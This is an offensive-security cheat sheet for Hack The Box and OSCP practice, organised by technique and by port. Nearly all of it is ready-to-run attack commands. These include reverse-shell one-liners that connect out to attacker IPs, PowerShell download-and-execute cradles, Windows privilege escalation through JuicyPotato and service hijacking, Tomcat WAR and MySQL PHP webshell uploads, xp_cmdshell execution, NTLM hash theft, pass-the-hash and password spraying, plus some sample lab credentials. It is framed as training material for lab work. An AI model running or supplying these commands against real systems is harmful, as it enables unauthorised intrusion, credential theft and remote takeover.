# Useful Commands for HTB/OSCP
**Website**: https://IslandDog.ky

**Last Update**: 06/28/22

**Recent Changes**: Huge changes to multiple sections pulled from my Obsidian. I'm back =).

## Required Links
https://book.hacktricks.xyz/

https://github.com/swisskyrepo/PayloadsAllTheThings

https://gtfobins.github.io/

https://lolbas-project.github.io/#

https://www.exploit-db.com/

https://www.exploit-db.com/google-hacking-database

https://weibell.github.io/reverse-shell-generator/

https://crackstation.net/

https://gchq.github.io/CyberChef/

## RustScan - #rustscan 
```bash
#Intial
echo 'export ip=10.10.11.168' > ~/.zshenv
rustscan -a $ip && xsltproc scan -o intial-${PWD##*/}.html
#AllPorts
sudo nmap -sC -sV -T4 -v -p- --script 'default,vuln' -oX scan-all $ip && xsltproc scan-all -o ${PWD##*/}-allports.html
#UDP
sudo nmap -sU -sV --version-intensity 0 -F -n $ip -oX ${PWD##*/}-udp
```

## Reverse Shell #OneLiners
```bash
#Visit - https://weibell.github.io/reverse-shell-generator/
bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/h
{nc.tradentional|nc|ncat|netcat} 10.0.0.1 1234 {-e|-c} /bin/bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
powershell IEX(New-Object Net.webclient).downloadString('http://10.10.14.4/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell 10.10.14.4 9002
```

## TTY SHELLS #tty
```bash
stty raw -echo; (stty size; cat) | nc -lvnp 9002
export SHELL=bash
export TERM=xterm OR export TERM=xterm-256color
```

#tty_python
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#tty_bash
```bash
echo os.system('/bin/bash')
```
#tty_sh
```sh
/bin/bash -i
```

#tty_perl
```perl
perl -e 'exec "/bin/bash"'
```

#tty_ruby
```rb
exec "/bin/bash"
```
#tty_lua
```bash
os.execute('/bin/bash')}
```

## File Uploading/Downloading #Windows #PowerShell #WGET #SMB 
```bash
#https://github.com/egre55/ultimate-file-transfer-list
#PowerShell Related
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/webshells/Invoke-PowerShellTcp.ps1')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/', '<DESTINATION_FILE>')
powershell "wget http://10.0.0.1/"
#Requires wget.vbs file
cscript wget.vbs http://10.0.0.1/file.exe FILEYOUNEED
sudo smbserver.py -comment 'Transfer' smb smb
#Use alongside curl/wget
sudo python3 -m http.server 80
sudo python -m SimpleHTTPServer 80
#Windows based
certutil.exe -urlcache -split -f "http://10.0.0.1/privesc/Powerless.bat" Powerless.bat
scp <SOURCE_FILE> <USER>@${PWD##*/}:<DESTINATION_FILE>
```

## PrivEsc Tools #PrivEsc #LinPEAS #WinPEAS #Powerless
```bash
./LinEnum.sh -s -r report -e /tmp/ -t
winPEAS.bat/exe
LinPeas.sh
python suid3num.py
Seatbelt.exe -group=all
powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
Powerless.bat
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

## PrivEsc Linux #PrivEsc #Linux #sudo #ssh 
```bash
#Mainly for CTFs
sudo -l
#See Full Hostname (useful if coming in from a low shell)
cat /proc/version || uname -a
cat /etc/os-release
#Check other networks running on the box
ifconfig
#Kernel Exploits #OS Exploits #Writable files owned by root that get executed (cronjobs)
wget http://10.0.0.1/linpeas.sh | sh
wget http://10.0.0.1/linenum.sh
#Password reuse (mysql, .bash_history, 000- default.conf...)
```
Updating with commands/references.
```txt
Known binaries with suid flag and interactive (nmap)
Custom binaries with suid flag either using other binaries or with command execution
MySQL as root
Vulnerable services (chkrootkit, logrotate)
Writable /etc/passwd
Readable .bash_history
SSH private key
Listening ports on localhost
/etc/fstab
/etc/exports
/var/mail
Process as other user (root) executing something you have permissions to modify
SSH public key + Predictable PRNG
apt update hooking (PreInvoke)
```

## PrivEsc Windows 

#### CHECK FOR ACTIVE CVEs
```bash
whoami /all
sysinfo
```
#SeImpersonate #SeAssignPrimaryToken
#JuicyPotato #RottenPotato #LonelyPotato #HotPotato #RoguePotato #PrintSpoofter
SeImpersonate/SeAssignPrimaryToken - If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are ```SYSTEM```. Review the different Potatoes.

If the machine is -
> Windows 10 1809 & Windows Server 2019 - Rogue Potato.
> Windows 10 1809 < Windows Server 2019 - Juicy Potato.
> Windows Server 2019 - PrintSpoofer

https://github.com/itm4n/PrintSpoofer

```powershell
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe 10.0.0.1 1234 -e c:\windows\system32\cmd.exe" -t *
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe 10.0.0.1 1234 -e c:\windows\system32\cmd.exe" -t * -c <CLSID>
```
#CLSID
https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md

#Autorun - To execute it with elevated privileges we need to wait for someone in the Admin group to login.
```powershell
cd C:\Program Files\Autorun Program\
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/shells/win-1234.exe', '.\win-1234.exe')
```

#AlwaysInstallElevated
```powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/shell-1234.msi', 'C:\Temp\shell-1234.msi')
msiexec /quiet /qn /i C:\Temp\shell-1234.msi
```

#ExecutableFiles
```powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/win-1234.exe', 'C:\Temp\win-1234.exe')
copy /y c:\Temp\win-1234.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
sc start filepermsvc
```

#WeakServicePermission
```powershell
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/nc.exe', '.\nc.exe') #Grab Windows Binary
sc config <SERVICENAME> binpath= "<PATH>\nc.exe 10.0.0.1 1234 -e cmd.exe"
sc start <SERVICENAME>
or 
net start <SERVICENAME>
```

#UnquotedServicePaths 
```powershell
cd "C:\Program Files\Unquoted Path Service\"
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/Common.exe', '.\Common.exe')
sc start unquotedsvc
```

#Startup
```powershell
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/win-1234.exe', '.\win-1234.exe')
```

## PORTS

### 21 #FTP  
```bash
#Anonymous logins
ftp ${PWD##*/}
nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 ${PWD##*/}
```

### 22 #SSH 
CVE-2008-0166 - https://www.exploit-db.com/exploits/5720

### 53 #DNS 
```bash
dig version.bind CHAOS TXT @$ip
dig $ip -x $ip
dnsenum $ip
dnsrecon -d $ip
dnsrecon -d $ip -a
dig $ip @IP axfr
```
### 79 #FINGER
```bash
finger @$ip
finger <USER>@$ip
finger "|/bin/id@$ip
finger "|/bin/ls -a /$ip"
```

### 80/8080/443 #HTTP 
#Visual
```
#Always intercept a request with Burp suite and check headers.
```
```bash
curl -I $ip
```
```
#Always view the source for external resources or scripts.
#Check forms/links to see if they are valid/calling out.
```
#DirectoryScan #FeroxBuster #HostScan #Logins
```bash
#FeroxBuster requires my config or additional flags for threads/etc.
#Use Raft - Words/Files/Directories.
feroxbuster -u $ip -e -w /opt/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt
ffuf -b 'PHPSESSID=kn7hggb0pkp4nn9oin2dfs9mcu' -w /opt/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt  -u 'https://website.htb/admin/?FUZZ'
#-p on nikto for specific ports.
# -useproxy for Burp/Squid intercepts.
nikto -host $ip -C all -o nikto-scan.html
```

#sub-domain #domains
```bash
gobuster vhost -u $ip -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
gobuster dns -d 'domain.htb' -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
ffuf -w /opt/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u 'domain.htb' -H "Host: FUZZ.domain.htb" -fw 1
```

#SQL
```bash
# --force-ssl flag for SSL bypass
sqlmap --wizard --dump-all
#Grab the Request from Burp for Login/Form Req
sqlmap -r req --os-pwn
#Use OS-Shell alongside a Bash One-liner for a more stable shell.
sqlmap -r req --os-shell
#Specify specific databases/tables
sqlmap -r req --force-ssl -D DATABASE -T TABLE --batch -C rows,rows,rows --dump
```

#IIS
```bash
#Use with ffuf to bruteforce directors
msf6 auxiliary(scanner/http/iis_shortname_scanner)
/opt/SecLists/Discovery/Web-Content/IIS.fuzz.txt
```

#WordPress 
```bash
#Can also be used for password sprays
wpscan --url $ip --enumerate ap,at,tt,cb,dbe,u,m
```

#webdav
```bash
cadaver http://domain.htb:8080/webdav/
```

#ShellShock
```bash
#Outdated
git clone https://github.com/nccgroup/shocker; cd shocker; ./shocker.py -H ${PWD##*/}  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose;  ./shocker.py -H ${PWD##*/} --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose
```

#CGI - Specific
```bash
ffuf -w /opt/SecLists/Discovery/Web-Content/CGI-XPlatform.fuzz.txt -u http://${PWD##*/}/ccgi-bin/FUZZ -t 50
ffuf -w /opt/SecLists/Discovery/Web-Content/CGIs.txt -u http://${PWD##*/}/ccgi-bin/FUZZ -t 50
ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://${PWD##*/}/cgi-bin/FUZZ -e .sh,.pl,.cgi -t 100
```

#TOMCAT - Upload payload

Tomcat6:
```bash
wget 'http://<USER>:<PASSWORD>@${PWD##*/}:8080/manager/deploy?war=file:shell.war&path=/shell' -O -
```

Tomcat7/Above:
```bash
curl -v -u <USER>:<PASSWORD> -T shell.war 'http://${PWD##*/}:8080/manager/text/deploy?path=/shellh&update=true'
```
```bash
#Then execute the payload
curl http://${PWD##*/}:8080/shell/
```

#GIT
```bash
#Grab both from GitHub
./gitdumper.sh http://${PWD##*/}/.git/ git
./extractor.sh git git-extracted
```

#LFI/RFI - LoginForms - #SecLists Generic-SQLi.txt
```bash
#https://raw.githubusercontent.com/carlospolop/Auto_Wordlists/main/wordlists
#/opt/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
ffuf -b 'PHPSESSID=kn7hggb0pkp4nn9oin2dfs9mcu' -w /opt/seclists/Fuzzing/LFI/LFI-Jhaddix.txt   -u 'https://website.htb/admin/?parameter=FUZZ' -fs 1712

```

#ImageUpload 
[PayloadsAllTheThings - Malicious Images](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md)

### 110 (JOHN/MAIL) #POP3
```cmd
telnet 10.10.10.51 110
USER mindy
PASS mindy
list
retr 1
```

### 135 #RPC 
```bash
rpcinfo -p ${PWD##*/}
```

### 139/445 - ```smb://[putinip]/```#SMB 
#smbclient - Start here
```bash
smbclient -N -L $ip
smbclient -L \\\\${PWD##*/} -U 'Tiffany.Molina'
smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //${PWD##*/}/new-site -c 'put nc.exe nc.exe'
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh'
\\\\${PWD##*/}\\c$
enum4linux -a -k none $ip
```
#crackmapexec #password_spray
```bash
crackmapexec smb $ip -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' --shares
crackmapexec smb $ip -u users.txt -p passwords.txt --shares --continue-on-success
medusa -h $ip -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
winexe -U username //$ip "cmd.exe" --system
```

#mounting-shares
```bash
mount -t cifs '//$ip/new-site' smb -v -o user=tyler
umount smb
```

#SMB - Shells via Impacket
```bash
psexec.py <DOMAIN>/<USER>:<PASSWORD>@$ip
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@$ip
smbexec.py <DOMAIN>/<USER>:<PASSWORD>@$ip
atexec.py <DOMAIN>/<USER>:<PASSWORD>@$ip <COMMAND>
```

#PTH - Pass the Hash
```bash
impacket-psexec -k Intelligence.htb/Administrator@dc.Intelligence.htb -no-pass
wmiexec.py <DOMAIN>/<USER>@${PWD##*/} -hashes :<NTHASH>
smbexec.py <DOMAIN>/<USER>@${PWD##*/} -hashes :<NTHASH>
atexec.py <DOMAIN>/<USER>@${PWD##*/} -hashes :<NTHASH>
pth-winexe -U username/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //${PWD##*/} cmd
```
### 161/162 #SNMP
```bash
snmp-check -c public $ip
onesixtyone -c /usr/share/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $ip
```

### 389/636/3268/3269 #LDAP
```bash
sudo nmap 7sV -p389 $ip
rpcclient -U '' -N $ip
enumdomusers
enumdomgroups
./kerbrute_linux_amd64 passwordspray --dc $ip -d domain.htb user_file "PasssWord"
/opt/kerbrute/kerbrute_linux_amd64 userenum --dc $ip -d domain.htb /opt/seclists/Usernames/top-usernames-shortlist.txt
ldapsearch -D "cn=admin,dc=acme,dc=com" "(objectClass=*)" -w ldapadmin -h $ip
ldapsearch -h $ip -p 389 -x -b "dc=megacorp,dc=local"
ldapsearch -h $ip -x -s base namingcontexts
ldapsearch -h $ip -x -s sub -b "DC=megacorp,DC=local" |tee ldap.out && cat ldap.out |grep -i memberof
impacket-GetUserSPNs domain.htb/user.name -dc-ip '$ip' -no-pass -request -outputfile hash
```

### 1433 #MSSQL

Enumeration
```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 ${PWD##*/}
```

Login #Impacket and Cracking #hydra -
```bash
mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@${PWD##*/}
mssqlclient.py <USER>:<PASSWORD>@${PWD##*/}
hydra -L users -P passwords ${PWD##*/} mssql -vV -I -u
```

Once logged in you can run queries:
```sql
SQL> select @@ version;
```

Try to enable code execution #xp_cmdshell -
```bash
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /all
SQL> xp_cmdshell "powershell -c IEX(New-Object System.Net.WebClient).DownloadString(\"http://10.0.0.1/www/webshells/Invoke-
PowerShellTcp.ps1\")
```

Steal the ```NTLM``` hash with responder, crack it with ```john``` or ```hashcat``` -
```sql
sudo smbserver.py -smb2support smb .
SQL> exec master..xp_dirtree '\\10.0.0.1\smb\'
```

### 1521 #Oracle
```bash
python3 odat.py all -s ${PWD##*/} -p 1521
mv ../www/shells/x64/rev-1234.exe .
python3 odat.py utlfile -s ${PWD##*/} -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ rev-1234.exe rev-1234.exe
python3 odat.py externaltable -s ${PWD##*/} -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ rev-1234.exe
```

### 2049 #NFS
```bash
showmount -e ${PWD##*/}
nmap --script=nfs-showmount ${PWD##*/}
sudo mount -v -t nfs ${PWD##*/}:<SHARE> <DIRECTORY>
sudo mount -v -t nfs -o vers=2 ${PWD##*/}:<SHARE> <DIRECTORY>
```
### 3306 #MySQL
```bash
nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 ${PWD##*/} -p 3306
hydra -L users -P passwords ${PWD##*/} mysql -vV -I -u
mysql -u <USER>
mysql -h ${PWD##*/} -u <USER> -p
connect [database]
use database;
show tables;
select * from [table name]
```
Try to execute code
```bash
select do_system('id');
\! sh
#Read&Write
select load_file('<FILE>');
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
```
### 3389 #RDP
```bash
rdesktop -u guest -p guest $ip -g 94%
rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> $ip
xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:$ip
xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:$ip
ncrack -vv --user Username -P /usr/share/wordlists/rockyou.txt rdp://$ip
```

### 5800/58001/5900/5901 #VNC
```bash
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p 5800,58001,5900,5901 ${PWD##*/}
Linux - Default password is stored in: ~/.vnc/passwd
Windows -
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
HKEY_CURRENT_USER\Software\TightVNC\Server
HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
C:\Program Files\UltraVNC\ultravnc.ini
```
### 5985/5986 #WinRM
```bash
crackmapexec winrm ${PWD##*/} -u users -p passwords
evil-winrm -i ${PWD##*/} -u <USER> -p <PASSWORD>
evil-winrm -i ${PWD##*/} -u <USER> -H <HASH>
```

### Misc

#PortForwarding 
```powershell
wget http://10.10.14.4/chisel.exe -o C:/downloads/crx/chisel.exe
#OnVictim - AttackIP:ChiselPort R:ReversePort:127.0.0.1:ReversePort
.\chisel client 10.10.14.4:9002 R:1433:127.0.0.1:1433
#OnAttacker
chisel server --reverse --port 9002
```

#Windows #ReverseShells
```bash
cp /usr/share/windows-resources/binaries/nc.exe .
nc.exe -e cmd 10.0.0.1 1234
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/webshells/Invoke-PowerShellTcp.ps1')
```

#RestrictedEnvironments
https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
```bash
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

#PasswordDump - Review other article 
```bash
secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds ntds.dit LOCAL
```

#Bruteforce
```bash
#Username Bruteforce on HTTP Form - Requires Error Code 'Invalid Credentials'
hydra -L /opt/seclists/Usernames/cirt-default-usernames.txt -p password -s 5000 10.10.10.10 http-form-post "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

#Firefox 
```bash
python3 firefox_decrypt.py br53rxeg.default-release
```

#BloodHound 
```bash
bloodhound-python -u UserName -p "PassWord" -ns 10.10.11.158 -d domain.htb -c all
sudo neo4j start
```

![[id.png|20x20]] IslandDog - Christopher Soehnlein 2021
https://IslandDog.ky
